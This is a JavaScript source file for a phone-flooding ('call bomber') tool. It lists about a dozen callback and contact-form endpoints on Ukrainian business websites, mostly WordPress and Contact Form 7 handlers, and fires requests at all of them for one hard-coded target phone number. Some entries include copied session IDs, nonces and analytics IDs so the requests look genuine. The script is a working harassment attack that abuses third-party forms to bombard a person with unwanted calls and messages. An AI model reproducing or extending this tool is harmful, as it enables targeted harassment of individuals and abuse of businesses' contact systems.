const Call = require('./call')

const data = [
    {
        url: 'https://intercity.if.ua/wp-content/themes/cannix-child/inc/send-message-to-telegram.php',
        method: 'post',
        type: 'FormData',
        body: phone => ({ phone }),
    },
    {
        url: () => `https://olvita.phonet.com.ua/rest/public/widget/call-catchers/545c90e8-2234-4760-984d-43280e21a47a/call?timestamp=${Date.now()}&utcOffset=-120`,
        method: 'post',
        body: phone => ({
            clientId: '863038775.1611755051', // !
            pageUrl: 'https://vernisazh.com.ua/kontakty.html',
            phone, // +380
            referrer: '(not set)', // !
            telerSessionId: 'c40c3425-e546-4a59-83ba-2fdbde8ed0c4', // !
            uaId: 'UA-153770169-1', // !
        })
    },
    {
        url: 'https://www.samgas.com.ua/system/ajax',
        method: 'post',
        type: 'FormData',
        body: phone => ({
            'submitted[name]': '',
            'submitted[phone]': phone, // +380
        })
    },
    {
        url: 'https://gabarchi.com.ua/kontakty/',
        method: 'post',
        type: 'FormData',
        body: phone => ({
            'input_1.3': '', // name
            'input_2': phone // +380
        })
    },
    {
        url: 'https://beclean.com.ua/wp-admin/admin-ajax.php',
        method: 'post',
        type: 'FormData',
        body: phone => ({
            phone, // +380
            name: '',
            action: 'vdz_cb_send',
            _wpnonce: '7817693277',
            _wp_http_referer: '/service/генеральне-прибирання/',
        })
    },
    {
        url: 'https://3gstar.com.ua/gsubmitclick.php',
        method: 'post',
        type: 'FormData',
        body: phone => ({
            phone, // +380
            form: 'internet-dlya-gruzoperevozok',
        }),
        parse: 'json'
    },
    {
        url: 'https://eledia.sumy.ua/wp-json/contact-form-7/v1/contact-forms/300/feedback',
        method: 'post',
        type: 'FormData',
        body: phone => ({
            'text-856': 'Name',
            'tel-502': phone, // +380
            'honeypot-839': '', //
        }),
        parse: 'json'
    },
    {
        url: 'https://copyright.royalty.in.ua/wp-json/contact-form-7/v1/contact-forms/167/feedback',
        method: 'post',
        type: 'FormData',
        body: phone => ({
            'tel-115': phone, // +380
        }),
        parse: 'json'
    },
    {
        url: 'http://www.znet.lviv.ua/php/process.php',
        method: 'post',
        type: 'FormData',
        body: phone => ({
            'subscriber': phone, // 380
        }),
        parse: 'json'
    },
    {
        url: 'https://cronvest.com/wp-admin/admin-ajax.php',
        method: 'post',
        type: 'FormData',
        body: phone => ({
            popup_contact_tel: phone, // +38(050) 516-57-77
            action: 'contact_form_popup',
            form_base: 'Заказ звонка с хедера',
            form_title: '( Страница - Автоломбард Запоріжжя)',
        }),
        parse: 'json'
    },
    {
        url: 'https://www.mytrinity.com.ua/api.php',
        method: 'post',
        type: 'FormData',
        body: phone => ({
            phone: phone, // +380
            type: 'recall',
        }),
        parse: 'json',
        isSuccess: res => res && res.success
    }
]

const call = new Call('+380505165776')

call
    .start(data)
    .on('send', () => {

    })
    .on('error', ({ err, site }) => {
        console.log(err, site)
    })
    .on('finish', () => {

    })
    